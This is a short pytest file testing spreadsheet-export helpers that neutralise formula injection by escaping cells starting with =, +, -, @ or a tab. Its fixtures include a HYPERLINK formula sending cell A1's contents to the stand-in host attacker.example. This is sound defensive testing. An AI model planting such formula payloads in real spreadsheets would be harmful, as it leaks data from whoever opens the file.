from openpyxl import load_workbook

import pandas as pd

from scripts.spreadsheet_export import neutralize_formula_text, safe_to_excel


def test_neutralize_formula_text_prefixes_formula_triggers():
    assert neutralize_formula_text('=HYPERLINK("http://example.test")').startswith("'=")
    assert neutralize_formula_text("+SUM(1,2)").startswith("'+")
    assert neutralize_formula_text("-10+cmd").startswith("'-")
    assert neutralize_formula_text("@SUM(1,2)").startswith("'@")
    assert neutralize_formula_text("\t=SUM(1,2)").startswith("'\t=")


def test_safe_to_excel_writes_formula_like_text_as_strings(tmp_path):
    output_path = tmp_path / "safe.xlsx"
    df = pd.DataFrame(
        {
            "time": [1, 2, 3],
            "sensor": [
                '=HYPERLINK("http://attacker.example/?x="&A1,"click")',
                "+SUM(1,2)",
                "normal text",
            ],
        }
    )

    safe_to_excel(df, output_path, index=False)

    worksheet = load_workbook(output_path, data_only=False).active
    assert worksheet["B2"].data_type == "s"
    assert worksheet["B2"].value.startswith("'=")
    assert worksheet["B3"].data_type == "s"
    assert worksheet["B3"].value.startswith("'+")
    assert worksheet["B4"].value == "normal text"
